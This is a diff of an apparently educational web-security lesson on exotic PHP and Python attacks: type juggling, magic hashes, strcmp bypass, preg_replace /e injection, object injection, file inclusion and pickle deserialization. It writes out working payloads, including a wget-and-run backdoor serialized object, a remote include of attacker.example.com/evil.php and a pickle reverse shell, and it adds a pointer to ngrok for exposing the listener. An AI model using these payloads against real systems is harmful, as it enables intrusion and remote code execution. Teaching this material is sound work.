@@ -1,3 +1,9 @@
+---
+linkTitle: 08. Exotic Attacks
+type: docs
+weight: 10
+---
+
 # Introduction
 
 As a web developer, you need to pay attention to the quirks of your chosen programming language.
@@ -8,13 +14,15 @@ There are lots of legacy websites which used this language to begin with, and a 
 Today, even if there are better options for the server-side choice, PHP is still pretty popular.
 
 ![Server Side Languages Popularity](./assets/language-stats.png)
-Source [here](https://w3techs.com/technologies/overview/programming_language)
+
+Source [here](https://w3techs.com/technologies/overview/programming_language).
 
 There are also lots of different PHP versions, each with its own vulnerabilities.
 A small insight into the distribution of versions across the web is:
 
 ![PHP Versions Popularity](./assets/version-stats.png)
-Source [here](https://w3techs.com/technologies/details/pl-php)
+
+Source [here](https://w3techs.com/technologies/details/pl-php).
 
 In this session we will focus on some exotic attacks against specific PHP functions and functionalities, as well as a quick overview of other interesting quirks.
 
@@ -34,45 +42,46 @@ In this section we will discuss **PHP type juggling** and how this can lead to a
 ![Type Juggling examples](./assets/type-juggling.png)
 
 ## How PHP compares values
-PHP has a feature called “_type juggling_”, or “_type coercion_”.
+
+PHP has a feature called "type juggling" or "type coercion".
 This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type.
 
-For example, when the program is comparing the string `“7”` and the integer `7` in the scenario below:
+For example, when the program is comparing the string `"7"` and the integer `7` in the scenario below:
 
 ```php
 <?php
-    $example_int = 7
-    $example_str = “7”
+    $example_int = 7;
+    $example_str = "7";
     if ($example_int == $example_str) {
-       echo("PHP can compare ints and strings.")
+       echo("PHP can compare ints and strings.");
     }
 ?>
 ```
 
-The code will run without errors and output _“PHP can compare ints and strings._”.
+The code will run without errors and output `PHP can compare ints and strings.`.
 This behavior is very helpful when you want your program to be flexible in dealing with different types of user input.
 
 However, it is also important to note that this behavior is also a major source of bugs and security vulnerabilities.
 
-For example, when PHP needs to compare the string `“7 puppies”` to the integer `7`, PHP will attempt to extract the integer from the string.
+For example, when PHP needs to compare the string `"7 puppies"` to the integer `7`, PHP will attempt to extract the integer from the string.
 So this comparison will evaluate to **True**.
 
-`(“7 puppies” == 7) -> True`
+`("7 puppies" == 7) -> True`
 
-But what if the string that is being compared does not contain an integer? The string will then be converted to a `“0”`.
+But what if the string that is being compared does not contain an integer? The string will then be converted to a `"0"`.
 So the following comparison will also evaluate to **True**:
 
-`(“Puppies” == 0) -> True`
+`("Puppies" == 0) -> True`
 
 You can try this yourself using an online PHP sandbox, such as [this one](http://www.writephponline.com/).
 
-## Loose Comparison vs.
-Strict Comparison (`==` vs `===`)
+## Loose Comparison vs. Strict Comparison (`==` vs `===`)
+
 The `==` and `!=` are the default comparison operators in other languages.
 But PHP has two main comparison modes, let’s call them **loose** (`==` and `!=`) and **strict** (`===` and `!==`).
 
 The strict mode works by also comparing the type of the variable as well as the value.
-So, for example, if we compare the number `7` and the string `“7”`, the result will be false because of the different types.
+So, for example, if we compare the number `7` and the string `"7"`, the result will be false because of the different types.
 This time, PHP won’t use type juggling before comparing the values.
 
 The following tables showcase the difference between the two comparison modes:
@@ -99,23 +108,23 @@ Let’s say the PHP code that handles authentication looks like this:
 
 Then, simply submitting an integer input of `0` would successfully log you in as admin, since this will evaluate to **True**:
 
-`(0 == “Admin_Password”) -> True`
+`(0 == "Admin_Password") -> True`
 
 ### Conditions of exploitation
 
 However, this vulnerability is not always exploitable and often needs to be combined with a deserialization flaw.
 The reason for this is that **POST**, **GET** parameters and **cookie** values are, for the most part, passed as strings or arrays into the program.
 
-If the **POST** parameter from the example above is passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed.
-And `“0”` and `“Admin_Password”` are, obviously, different strings.
+If the **POST** parameter from the example above was passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed.
+And `"0"` and `"Admin_Password"` are, obviously, different strings.
 
-`(“0” == “Admin_Password”) -> False`
+`("0" == "Admin_Password") -> False`
 
 However, type juggling issues can be exploited if the application accepts the input via functions like `json_decode()` or `unserialize()`.
 This way, it would be possible for the end-user to specify the type of input passed in.
 
-`{“password”: “0”}`
-`{“password”: 0}`
+`{"password": "0"}`
+`{"password": 0}`
 
 Consider the above JSON blobs.
 The first one would cause the password parameter to be treated as a string whereas the second one would cause the input to be interpreted as an integer by PHP.
@@ -128,10 +137,10 @@ As a developer, there are several steps that you can take to prevent these vulne
 ### Use strict comparison operators
 
 When comparing values, always try to use the type-safe comparison operator `===` instead of the loose comparison operator `==`.
-This will ensure that PHP does not type juggle and the operation will only return true if the types of the two variables also match.
-This means that `(7 === “7”)` will return false.
+This will ensure that PHP does not type juggle and the operation will only return **True** if the types of the two variables also match.
+This means that `(7 === "7")` will return **False**.
 
-### Specify the “strict” option for functions that compare
+### Specify the "strict" option for functions that compare
 
 Always consult the PHP manual on individual functions to check if they use loose comparison or type-safe comparison.
 See if there is an option to use strict comparison and specify that option in your code.
@@ -144,29 +153,31 @@ If the function only provides loose comparison, avoid using that function and se
 
 Avoid typecasting right before comparing values, as this will essentially deliver the same results as type juggling.
 For example, before typecasting, the following three variables are all seen as distinct by the type-safe operator.
+
 ```php
 <?php
-    $example_int = 7
-    $example_str = “7_string”
-    $example_str_2 = “7”
+    $example_int = 7;
+    $example_str = "7_string";
+    $example_str_2 = "7";
     if ($example_int === $example_str) {
-        # This condition statement will return False
+        // This condition statement will return False
         echo("This will not print.");
     }
     if ($example_int === $example_str_2) {
-       # This condition statement will return False
+       // This condition statement will return False
         echo("This will not print.");
     }
 ?>
 ```
 
-Whereas after typecasting, PHP will only preserve the number extracted from a string, and `“7_string”` will become the integer `7`.
+Whereas after typecasting, PHP will only preserve the number extracted from a string, and `"7_string"` will become the integer `7`.
+
 ```php
 <?php
-    $example_int = 7
-    $example_str = “7_string”
+    $example_int = 7;
+    $example_str = "7_string";
     if ($example_int === (int)$example_str) {
-        # This condition statement will return True
+        // This condition statement will return True
         echo("This will print.");
     }
 ?>
@@ -176,10 +187,11 @@ Whereas after typecasting, PHP will only preserve the number extracted from a st
 
 ## Magic hashes
 
-Magic hashes are hashes that start with a leading `0e` (the scientific notation for _“0 to the power of some value”_) and have only numbers after that.
+Magic hashes are hashes that start with a leading `0e` (the scientific notation for "0 to the power of some value") and have only numbers after that.
 
 Let's say you stored a hashed password that looks like this: `0e462097431906509019562988736854`, which is the value returned by `md5(240610708)`.
 Being a magic hash, if we use the loose comparison operator `==` against the user input and provide `0` as value, the following code will always return "Matched".
+
 ```php
 <?php
     $passwordHash = md5('240610708');
@@ -194,7 +206,7 @@ Being a magic hash, if we use the loose comparison operator `==` against the use
 
 Below is a table of such hashes discovered so far:
 
-| Hash Type | Hash Length | “Magic” Number / String | Magic Hashes                              | Found By                |
+| Hash Type | Hash Length | "Magic" Number / String | Magic Hashes                              | Found By                |
 | --------- | ----------- | ----------------------- | ----------------------------------------- | ----------------------- |
 | md2     | 32    | 505144726             | 0e015339760548602306096794382326          | WhiteHat Security, Inc. |
 | md4     | 32    | 48291204              | 0e266546927425668450445617970135          | WhiteHat Security, Inc. |
@@ -224,9 +236,9 @@ But what happens if we use the following code to check for a password?
 ```php
 <?php
     if (strcmp($password, $_POST['password']) == 0) {
-  $success = true;
+        $success = true;
     } else {
-  $success = false;
+        $success = false;
     }
 ?>
 ```
@@ -242,6 +254,7 @@ This means that `NULL` will be equal to `0` and so we could bypass the authentic
 
 The `preg_replace()` function is used to perform regular expressions search and replace.
 A legitimate use of it could be:
+
 ```php
 <?php
     $in = 'Somewhere, something incredible is waiting to be known';
@@ -257,7 +270,7 @@ Well, not at all.
 The above code is vulnerable to code injection as it fails to account for dangerous [PCRE modification flags](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) in the input string.
 Most modifiers are quite harmless and let you do things like case-insensitive and multi-line searches, however one modifier, `e` will cause PHP to execute the result of the `preg_replace()` operation as PHP code.
 
-The payload: `?replace=/Known/e&with=system(‘whoami’)`
+The payload is: `?replace=/Known/e&with=system(‘whoami’)`
 
 This is extremely dangerous, as it gives an attacker the opportunity to execute any PHP code.
 
@@ -316,6 +329,7 @@ A more comprehensive list of PHP magic methods would be this one:
     }
 ?>
 ```
+
 Payload:
 
 ```
@@ -334,7 +348,7 @@ The payload could look like this:
 <?php
     class PHPObjectInjection
     {
-        // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+        // Change URL/ filename to match your setup
         public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
     }
     echo urlencode(serialize(new PHPObjectInjection));
@@ -348,15 +362,16 @@ Of course, there are many other methods to achieve a reverse shell once you have
 ```php
 <?php
     include("credentials.php");
-    # $adminName = "random";
-    # $adminPassword = "pass";
+
+    // $adminName = "random";
+    // $adminPassword = "pass";
 
     $data = unserialize($_COOKIE['auth']);
 
     if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
-  echo "You logged in as admin!";
+        echo "You logged in as admin!";
     } else {
-  echo "Login failed!";
+        echo "Login failed!";
     }
 ?>
 ```
@@ -396,16 +411,13 @@ Once a malicious file was uploaded (such as a reverse shell), the attacker can c
 
 ```php
 <?php
-  /**
-   * Get the filename from a GET input
-   * Example - http://example.com/?file=filename.php
-   */
-  $file = $_GET['file'];
-  /**
-   * Unsafely include the file
-   * Example - filename.php
-   */
-  include('directory/' . $file);
+    // Get the filename from a GET input
+    // Example - http://example.com/?file=filename.php
+    $file = $_GET['file'];
+
+    // Unsafely include the file
+    // Example - filename.php
+    include('directory/' . $file);
 ?>
 ```
 
@@ -418,16 +430,13 @@ This file could be a reverse shell and give the attacker **full system control**
 
 ```php
 <?php
-  /**
-   * Get the filename from a GET input
-   * Example - http://example.com/?file=index.php
-   */
-  $file = $_GET['file'];
-  /**
-   * Unsafely include the file
-   * Example - index.php
-   */
-  include($file);
+    // Get the filename from a GET input
+    // Example - http://example.com/?file=index.php
+    $file = $_GET['file'];
+
+    // Unsafely include the file
+    // Example - index.php
+    include($file);
 ?>
 ```
 
@@ -435,8 +444,7 @@ Payload: `http://example.com/?file=http://attacker.example.com/evil.php`
 
 **Note:** Even though some web servers run as **root** (**which is a very bad practice**), most of them run as a special user (**www-data**) which doesn’t have root privileges.
 This means that getting a reverse shell on a web server will grant you only the rights of the user running the website.
-In order to get root access on the machine, further **privilege escalation** methods should be employed, such as looking for **SUID binaries**.
-As this exceeds the scope of this session, you can read more here: [Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation).
+In order to get root access on the machine, further **privilege escalation** methods should be employed, which you will learn about in a future session.
 
 ### Example of a simple reverse shell in PHP:
 
@@ -458,23 +466,25 @@ Essentially, this means that you can convert a Python object into a stream of by
 
 When consulting the Python docs for pickle one cannot miss the following warning:
 
-**`Warning: The pickle module is not secure. Only unpickle data you trust.`**
+`Warning: The pickle module is not secure. Only unpickle data you trust.`
 
 Let's have a look at how `pickle` handles your data. In Python you can serialize objects by using `pickle.dumps()`:
 
 ```python
 import pickle
+
 pickle.dumps(['pickle', 'me', 1, 2, 3])
 ```
 
 The pickled representation we’re getting back from dumps will look like this:
 
-`b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.`
+`b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e'`
 
 And now reading the serialized data back in...
 
 ```python
 import pickle
+
 pickle.loads(b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.')
 ```
 
@@ -489,13 +499,13 @@ What is actually happening behind the scenes is that the byte-stream created by 
 Not every object can be serialized (e.g. file handles) and pickling and unpickling certain objects (like functions or classes) comes with restrictions.
 The Python docs give you a good overview of what can and cannot be pickled.
 
-While in most cases you don’t need to do anything special to make an object “picklable”, pickle still allows you to define a custom behavior for the pickling process for your class instances.
+While in most cases you don’t need to do anything special to make an object "picklable", pickle still allows you to define a custom behavior for the pickling process for your class instances.
 
-Reading a bit further down in the docs we can see that implementing __reduce__ is exactly what we would need to get code execution, when viewed from an attacker’s perspective:
+Reading a bit further down in the docs we can see that implementing `__reduce__` is exactly what we would need to get code execution, when viewed from an attacker’s perspective:
 
-> The __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). [...]
+> The `__reduce__()` method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the "reduce value"). [...]
 When a tuple is returned, it must be between two and six items long.
-Optional items can either be omitted, or None can be provided as their value.
+Optional items can either be omitted, or `None` can be provided as their value.
 The semantics of each item are in order:
 > * A callable object that will be called to create the initial version of the object.
 > * A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. [...]
@@ -524,10 +534,12 @@ if __name__ == '__main__':
 ```
 
 This code will generate a reverse shell, which opens the possibility of **RCE** on the target machine.
+In order to accomplish this, you also need to make sure the port is accessible to the Internet.
+You may find some simple instructions for how to do this [here](https://securiumsolutions.com/blog/reverse-shell-using-tcp/), using `ngrok`.
 Again, it's one of the most dangerous vulnerabilities for a web application, whatever the programming language was chosen for the back-end (be it **PHP**, **Python**, **JavaScript**, **Ruby**, etc.), and the programmer should be aware and protect it against malicious actors.
 Also, always research the functions and modules used inside your application to prevent such vulnerabilities.
 
-# Wrap-Up
+# Wrap Up
 
 As you have seen so far, even a small mistake, such as using `==` instead of `===`, can cause your application to break at unexpected input.
 From an attacker standpoint, you can never know if the programmer was careful enough when writing the code, so you should always research and test what exploits can the application be vulnerable to, specific to the language / framework used.
